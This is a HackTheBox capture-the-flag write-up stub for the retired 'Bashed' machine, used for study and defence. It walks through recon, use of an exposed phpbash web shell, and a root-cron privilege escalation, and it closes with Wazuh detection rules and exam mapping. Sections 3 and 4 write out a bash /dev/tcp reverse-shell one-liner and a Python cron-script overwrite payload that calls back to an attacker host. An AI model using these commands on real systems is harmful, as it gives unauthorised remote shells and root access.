# Bashed — HackTheBox

> **Preparation stub.** Based on publicly documented information about this retired machine — not an
> original solve, and no live flag values are recorded. Use this as a study scaffold; complete the
> bracketed fields when working the box under your own account. Only document legally authorised
> activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | HackTheBox |
| Machine | Bashed |
| Difficulty | Easy |
| Category | Linux |
| Target IP | 10.10.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Linux web host whose blog advertises **phpbash** — a standalone PHP web shell — and that very tool
is left reachable on the server itself under `/dev/`. Browsing it gives command execution as
**www-data** with no exploit required. `sudo -l` shows www-data may run commands as the
**scriptmanager** user; that user owns `/scripts`, where a **root cron** executes a Python script
every minute. Overwriting the script yields **root**.

## Key vulnerability class

- **CWE:** CWE-489 / CWE-552 (a development/debug artefact — a web shell — left exposed) for the
  foothold; CWE-250 / CWE-732 (excessive sudo + a root cron over a user-writable script) for privesc.
- **Why it matters:** "a debugging tool left in production" is a real and common finding, and the
  cron-over-writable-script privesc is one of the most frequently reused Linux escalation patterns.

## 1. Reconnaissance

```
nmap -sC -sV -p- --min-rate 1000 -oA nmap/bashed 10.10.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Note |
|------|---------|------|
| 80/tcp | http (Apache) | The only vector — a blog about phpbash |

**nmap flag rationale:**
- `-p-` — confirms a *single* open port (80); a one-service box means go depth-first on the web app.
- `-sV` — Apache version + the blog content (which itself names the tool to look for).
- `-sC` — `http-title`/`http-enum` surface the blog early.

**What to look for:** a single web port and blog content that *names its own tooling* (phpbash) — a
strong hint to hunt for that tool on the host.

## 2. Enumeration

```
gobuster dir -u http://10.10.x.x/ -w /usr/share/wordlists/dirb/common.txt -x php
# discovers /dev/, /uploads/, /php/ ...
```
- `/dev/` contains **`phpbash.php`** — an interactive web shell already present on the server. No
  exploit needed; the foothold is a misplaced debug tool.
- *Tool selection:* `gobuster`/`feroxbuster` with a `.php` extension flag — the win is content
  discovery, and reading the blog first told you what filename to expect.

## 3. Exploitation

- Browse `http://10.10.x.x/dev/phpbash.php` → an in-browser shell as **www-data**.
- For a stable shell, upgrade to a reverse shell from phpbash (`bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'`)
  and stabilise with a PTY.
- *Vector choice:* using the existing web shell is the intended, lowest-footprint path; record that a
  manual upload would have been the fallback had `/dev/` not existed.
- [User flag on completion.]

## 4. Post-exploitation (privilege escalation)

```
sudo -l                 # (ALL) NOPASSWD: ... as scriptmanager
sudo -u scriptmanager /bin/bash
ls -la /scripts         # test.py (scriptmanager) + test.txt (root, rewritten each minute)
```
- The minute-by-minute change to `test.txt` (owned by **root**) proves a **root cron** runs
  `test.py` from `/scripts`. As scriptmanager you can **overwrite `test.py`**:
  ```
  echo 'import os; os.system("bash -c \'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\'")' > /scripts/test.py
  ```
- Next cron tick executes it as **root** → root shell.
- [Root flag on completion.]

## 5. Tools used

`nmap`, `gobuster`/`feroxbuster`, browser (phpbash), `nc`, `python3`, `sudo`, manual cron analysis.

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Reconnaissance / Discovery | Active scanning; file & directory discovery | T1595 / T1083 |
| Initial Access / Persistence | Web shell (pre-existing) | T1505.003 |
| Execution | Unix shell | T1059.004 |
| Privilege Escalation | Abuse elevation control — sudo | T1548.003 |
| Privilege Escalation | Scheduled task/job — cron | T1053.003 |

## 7. Key learnings

- **Read the app before scanning blindly** — the blog named the exact tool (phpbash) to find.
- A **debug/dev artefact in production** (`/dev/phpbash.php`) is a finding in its own right.
- `sudo -l` first, always; then look for a **root cron over a writable script** — the classic chain.

## 8. Defender perspective — logs & detection

- **Apache access log:** repeated `POST`/`GET` to `/dev/phpbash.php` — an interactive web shell shows
  as a single endpoint hit many times with command-like parameters.
- **auditd:** `www-data` running `sudo -u scriptmanager`; then a Python process spawned by **cron**
  (`CROND` parent) running as root from `/scripts/test.py`.
- **FIM (syscheck):** modification of `/scripts/test.py` by a non-root user, immediately before a
  root-owned process runs it.

### Wazuh detection rule (→ [watchtower](../../watchtower))

```xml
<group name="web,apache,auditd,fim,attack,">
  <!-- Web shell endpoint access -->
  <rule id="100520" level="12">
    <decoded_as>web-accesslog</decoded_as>
    <url type="pcre2">/phpbash\.php</url>
    <description>phpbash web shell accessed (T1505.003)</description>
    <mitre><id>T1505.003</id></mitre>
  </rule>
  <!-- A user-writable cron script changed, then run as root -->
  <rule id="100521" level="13">
    <if_group>syscheck</if_group>
    <field name="file" type="pcre2">^/scripts/.*\.py$</field>
    <description>Cron-executed script in /scripts modified — privesc via root cron (T1053.003)</description>
    <mitre><id>T1053.003</id><id>T1548.003</id></mitre>
  </rule>
</group>
```
**Validation:** access phpbash and confirm 100520; with `<syscheck>` watching `/scripts`, overwrite
`test.py` and confirm 100521 before the cron tick. Sub-techniques: **T1505.003**, **T1059.004**,
**T1548.003**, **T1053.003**.

## Exam relevance — Sec+ SY0-701

| SY0-701 objective | How Bashed makes it concrete |
|-------------------|-------------------------------|
| **2.3** Misconfiguration / dev artefacts | A web shell left in production = weak configuration / improper deployment. |
| **4.1** Hardening | Remove debug tooling before prod; least-privilege the web user. |
| **2.3 / 3.1** Least privilege | Excessive `sudo` + a root cron over a writable script are privilege-boundary failures. |
| **4.4 / 4.8** Monitoring & FIM | FIM on the cron script is exactly the §4 file-integrity-monitoring control. |
| **2.4** Indicators | phpbash hits + a user-modified root-run script are the indicators (§8). |

**Interview line:** "Bashed is two deployment mistakes — a debug web shell shipped to prod and a root
cron running a script a low-priv user can edit. FIM on that script and removing the dev tool both
close it."

## 9. References

- phpbash project — standalone PHP web shell (a dev/debug tool).
- GTFOBins / standard Linux privilege-escalation checklists (sudo, cron).
- MITRE ATT&CK T1505.003 / T1059.004 / T1548.003 / T1053.003.
